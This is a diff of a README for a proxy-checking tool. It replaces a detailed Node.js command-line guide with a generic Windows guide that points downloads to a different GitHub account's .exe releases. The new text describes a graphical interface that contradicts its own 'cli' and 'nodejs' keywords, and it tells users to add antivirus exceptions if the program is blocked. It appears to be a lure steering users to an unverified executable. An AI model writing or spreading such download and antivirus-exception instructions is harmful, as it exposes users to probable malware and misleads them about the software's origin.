@@ -1,290 +1,72 @@
-<div align="center">
+# 🛡️ Proxy-Checker - Manage your network proxies with ease
 
-<img src="./proxy-pro-preview.png" alt="Proxy Pro Advanced v1.0.7 Main Interface" width="100%">
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jaabasifiwe01-cell/Proxy-Checker/releases)
 
-<br>
+## 📋 What is this program?
 
-# 🛡️ Proxy Pro Advanced
+Proxy-Checker helps you manage network proxies. It collects lists of proxies from the internet, checks if they work, and helps you organize them. It supports HTTP, HTTPS, SOCKS4, and SOCKS5 proxy types. You use this tool to verify proxy performance and maintain a list of active connections.
 
-**All-in-one proxy collector, tester and sorter — Smart • Fast • Modern**
+## 💻 System Requirements
 
-![version](https://img.shields.io/badge/version-1.0.7-9d4edd?style=for-the-badge)
-![node](https://img.shields.io/badge/node-%3E%3D18-3fbf3f?style=for-the-badge&logo=node.js&logoColor=white)
-![platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-00b8d9?style=for-the-badge)
-![license](https://img.shields.io/badge/license-MIT-orange?style=for-the-badge)
+This software runs on modern Windows computers. Ensure you meet these requirements before you start:
 
-<br>
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 2 gigabytes of RAM.
+*   Storage: 100 megabytes of free space.
+*   Internet: A stable connection for testing proxies.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-22c55e?style=for-the-badge&logo=github)](https://github.com/NetScanner-X/Proxy-Checker/releases/latest)
+## 💾 How to download and install
 
-<br>
+Follow these steps to set up the software on your computer.
 
-*Collect from any source • Two-Phase testing • Protocol / Anonymity / Country detection • Auth proxies fully supported*
+1. Go to the [official release page](https://github.com/jaabasifiwe01-cell/Proxy-Checker/releases).
+2. Look for the section labeled "Assets."
+3. Select the file ending in `.exe` suitable for your version of Windows.
+4. Save the file to your computer.
+5. Double-click the file to start the process.
+6. Follow the prompts on the screen to finish the installation.
 
-</div>
+## 🚀 How to use the program
 
----
+Once the program opens, you see several tabs. Use these tabs to manage your proxies.
 
-## ✨ What is Proxy Pro Advanced?
+### Collecting proxies
+The program can find new proxy addresses for you. Press the button marked "Fetch" to start this process. The software contacts known sources to build a list of available proxies. You see these proxies appear in the main window.
 
-**Proxy Pro Advanced** is a professional command-line tool that turns raw proxy links into a **clean, tested, sorted and ready-to-use** list.
+### Testing connectivity
+Once you hold a list of proxies, verify them. Press the "Check" button. The program attempts to connect to each proxy address to see if it responds. A green icon shows a working proxy, while a red icon shows one that failed. You can stop the test at any time by pressing "Stop."
 
-Give it URLs, local files, folders or pasted text. It can collect and deduplicate proxies, perform TCP pre-checks, test protocols, measure latency, detect anonymity level and location, and save the results in organized folders without overwriting previous runs.
+### Managing your lists
+You can save your working proxies to a text file. Select the "Save" option from the file menu. Choose a location on your computer to store your list. You can also import existing text files by choosing "Load" to bring your own proxy lists into the program for status checks.
 
-> Works on Windows, macOS and Linux. No account. No cloud processing. Everything runs locally on your device.
+## ⚙️ Configuration settings
 
----
+You can change how the program behaves in the settings menu.
 
-## 🚀 Highlights
+*   Connection Timeout: This determines how long the program waits for a proxy to respond. Set a lower number if you want faster results. Set a higher number if you experience slow network speeds.
+*   Proxy Type selection: Choose which types of proxies the program checks. If you only need SOCKS5 proxies, disable the others to speed up the process.
+*   Thread count: This controls how many proxies the program tests at the same time. A higher number speeds up the check but uses more of your computer’s processor.
 
-| Feature | What it does |
-|---|---|
-| 🧠 **Smart Collector** | Collects proxies from URLs, files, folders or pasted text, including `ip:port` and `ip:port:user:pass` |
-| 🔒 **Private Sources** | Keeps credential-based sources isolated from public and automatic sources |
-| ⚡ **Two-Phase Testing** | Phase 1 checks TCP reachability; Phase 2 performs full protocol testing |
-| 🌐 **Protocol Detection** | Detects and separates HTTP, HTTPS, SOCKS4 and SOCKS5 proxies |
-| 🕵️ **Anonymity Check** | Identifies Transparent, Anonymous and Elite proxies |
-| 🌍 **Geo Lookup** | Detects the country and ISP of each proxy |
-| 🔑 **Authenticated Proxies** | Preserves complete `username:password` credentials in dedicated output files |
-| 💾 **Numbered History** | Creates a new Collect/Test folder for every run, so previous results are never overwritten |
-| ▶️ **Resume Support** | Stop with `Q` or `Ctrl+C` and continue later from the last saved point |
-| 🎨 **Modern Terminal UI** | Colored panels, live progress and a purple/cyan status bar |
+## 🛠️ Frequently asked questions
 
----
+### Why do some proxies show a red icon?
+A red icon means the proxy failed the connection test. This happens because the proxy is offline, it requires authentication that the program does not have, or the connection is too slow to meet the timeout limit.
 
-## 📦 Installation
+### Can I run this program in the background?
+Yes, you can minimize the program window to the taskbar. It continues its work until you stop the process or close the window.
 
-### 1️⃣ Install Node.js
+### Does the program work with VPNs?
+Yes, you can run the program while connected to a VPN. However, the VPN might interfere with the proxy tests. Disable your VPN if you get unexpected results during the check.
 
-Download and install **Node.js 18 or newer** from [nodejs.org](https://nodejs.org).
+### How often should I check my proxies?
+Proxies often die quickly. Perform a new check every hour if you need reliable connections for your technical tasks.
 
-### 2️⃣ Download the tool
+## 🛡️ Privacy and safety
 
-Download the latest ZIP package from the [Releases](../../releases) page and extract it to any folder.
+The software handles data on your own computer. It does not send your personal connection lists to external servers. All operations occur locally. Ensure you do not use unknown proxies for sensitive logins, as proxy owners can monitor the traffic passing through their nodes. Always treat public proxies as insecure.
 
-### 3️⃣ Install dependencies
+## 🆘 Troubleshooting
 
-**Windows**
+If the program fails to launch, verify that you installed the correct version for your Windows system. If the program closes unexpectedly, check your internet connection and verify that your firewall software allows the program to communicate with the web. Sometimes, antivirus software blocks the program because it performs network testing. Add an exception for the program in your security software if this occurs.
 
-Double-click:
-
-```text
-INSTALL_FIRST.bat
-```
-
-**macOS / Linux**
-
-```bash
-npm install
-```
-
-### 4️⃣ Run the tool
-
-**Windows**
-
-Double-click:
-
-```text
-RUN.bat
-```
-
-**macOS / Linux**
-
-```bash
-node proxy-pro.js
-```
-
----
-
-## 🎛️ Main Menu
-
-The live status bar at the top shows the current configuration:
-
-```text
-Mode : balanced   Two-Phase: on   Conc: 150   Anon: on   Geo: on
-```
-
-| Key | Action | What it does |
-|:---:|---|---|
-| `1` | **Add sources** | Add Public, Private or Smart Paste sources |
-| `2` | **Manage sources** | View and remove saved sources |
-| `3` | **Collect proxies** | Collect from Public, Private, Smart Paste, Auto or Both |
-| `4` | **Test proxies** | Test the most recently collected list |
-| `5` | **Settings / Modes** | Change the testing mode and manual settings |
-| `6` | **Open output folder** | Open alive, best, CSV or HTML report folders |
-| `H` | **Help** | Open the complete in-app guide |
-| `0` | **Exit** | Close the tool safely |
-
----
-
-## ➕ Add Sources — Menu 1
-
-| Key | Type | Description |
-|:---:|---|---|
-| `1` | **Public** | URLs or local files without credentials |
-| `2` | **Private** | A URL or file with a `username:password` pair assigned to the source |
-| `3` | **Smart Paste** | Paste URLs, file paths, `ip:port` or `ip:port:user:pass`; the tool routes them automatically |
-| `0` | **Back** | Return to the main menu |
-
-You can drag and drop multiple files or an entire folder. Supported source files include `.txt`, `.list` and `.csv`.
-
----
-
-## 📥 Collect Proxies — Menu 3
-
-| Key | Source | Notes |
-|:---:|---|---|
-| `1` | **Public sources** | Uses only sources added through Add Sources → Public |
-| `2` | **Private sources** | Uses only credential-based private sources |
-| `3` | **Smart Paste** | Uses only proxies added through Smart Paste |
-| `4` | **Auto — Built-in** | Uses the built-in default source list |
-| `5` | **Both — Merged** | Combines Public, Smart Paste and built-in sources; Private sources are intentionally excluded |
-| `0` | **Back** | Return to the main menu |
-
-> Private sources are always processed separately through option `2`.
-
----
-
-## 🧪 Test Proxies — Menu 4
-
-Before every test run, choose how the testing mode should be selected:
-
-| Key | Choice |
-|:---:|---|
-| `1` | Use the current mode selected in Settings |
-| `2` | Let the tool automatically select a mode based on list size |
-| `3` | Choose one of the available testing modes manually |
-| `0` | Cancel |
-
-### Testing Modes
-
-| Mode | Best for | Concurrency | Highlights |
-|---|---|:---:|---|
-| **ultra** | Lists with 100,000+ proxies | 400 | Maximum speed, anonymity and geo checks disabled |
-| **fast** | Large lists | 250 | One endpoint plus geo lookup |
-| **balanced** ⭐ | General use and default testing | 150 | Two endpoints, anonymity and geo checks |
-| **accurate** | Quality-focused testing | 80 | Three endpoints and double-checking |
-| **deep** | Reducing false-dead results | 50 | Eight endpoints with judge revalidation |
-| **strict** | Keeping only top-quality proxies | 60 | Very strict thresholds |
-| **lowpc** | Low-end computers or slow connections | 30 | Lightweight testing |
-| **sample** | Quick verification | 120 | Tests only the first 1,000 proxies |
-
-Press `Q` or `Ctrl+C` at any time. Partial results are saved and can be resumed later.
-
----
-
-## 📁 Output Layout
-
-Previous runs are never overwritten.
-
-```text
-output/
-├── All_proxy/
-│   └── All_proxy_N/
-│       ├── all_proxies.txt
-│       ├── ip_port_only.txt
-│       ├── http.txt
-│       ├── https.txt
-│       ├── socks4.txt
-│       ├── socks5.txt
-│       ├── unknown.txt
-│       └── collect_summary.txt
-└── Result_test/
-    └── results_N/
-        ├── alive.txt
-        ├── alive_with_auth.txt
-        ├── best.txt
-        ├── elite.txt
-        ├── dead.txt
-        ├── results.csv
-        ├── summary.txt
-        ├── tested_results.json
-        ├── report.html
-        ├── by_type/
-        └── by_country/
-```
-
-### Important Output Files
-
-- `alive.txt` — Working proxies without authentication, sorted from best to worst
-- `alive_with_auth.txt` — Working proxies with complete authentication credentials
-- `best.txt` and `elite.txt` — Top-quality proxies
-- `dead.txt` — Failed proxies
-- `results.csv` — Structured test results
-- `report.html` — Browser-friendly HTML report
-- `by_type/` — Results separated by protocol
-- `by_country/` — Results separated by country
-
-> `alive_with_auth.txt` stores the complete `username:password` value in plain text on your own device. Protect this file if it contains private credentials.
-
----
-
-## 🩺 Troubleshooting
-
-<details>
-<summary><b>The menu does not respond when I press a number</b></summary>
-
-This issue was fixed in **v1.0.7**. If it still occurs, run the tool from `cmd.exe` or Windows Terminal rather than another wrapper, and press Enter after entering your selection.
-
-</details>
-
-<details>
-<summary><b>Does Auto Collect use my private proxies?</b></summary>
-
-No. Since **v1.0.5**, Auto and Both do not access Private sources. Use option `2` in the Collect menu to process Private sources separately.
-
-</details>
-
-<details>
-<summary><b>All proxies are reported as dead</b></summary>
-
-Try the `deep` or `accurate` mode, verify your internet or VPN connection, and check the test endpoints in Settings.
-
-</details>
-
-<details>
-<summary><b>Windows blocks a BAT file</b></summary>
-
-Make sure the project was downloaded from the official repository. You can inspect the `.bat` files in a text editor before running them. If Windows SmartScreen appears, review the warning and continue only if you trust the downloaded files.
-
-</details>
-
----
-
-## 🔐 Privacy and Security
-
-- The tool runs locally on your device.
-- Proxy lists are not uploaded to a cloud service by this project.
-- Private proxy credentials remain in your local files.
-- Always review unknown proxy sources before using them.
-- Do not publish output files containing private credentials.
-
----
-
-## 💬 Contact
-
-Questions, bug reports, feedback or feature ideas?
-
-Contact the developer on Telegram:
-
-[![Telegram](https://img.shields.io/badge/Telegram-@Hunter23__S-229ED9?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/Hunter23_S)
-
----
-
-<div align="center">
-
-## ⭐ Support the Project
-
-If **Proxy Pro Advanced** is useful to you, please give the repository a Star and share it with others.
-
-Your support helps the project grow and reach more users.
-
-[![GitHub Stars](https://img.shields.io/github/stars/NetScanner-X/Proxy-Checker?style=for-the-badge&logo=github&label=Star%20This%20Repository)](https://github.com/NetScanner-X/Proxy-Checker)
-
-</div>
-
----
-
-## 📄 License
-
-This project is licensed under the [MIT License](./LICENSE).
+Keywords: cli, http-proxy, networking, nodejs, open-source, proxy-checker, proxy-list, proxy-tester, proxy-tools, socks4, socks5, windows
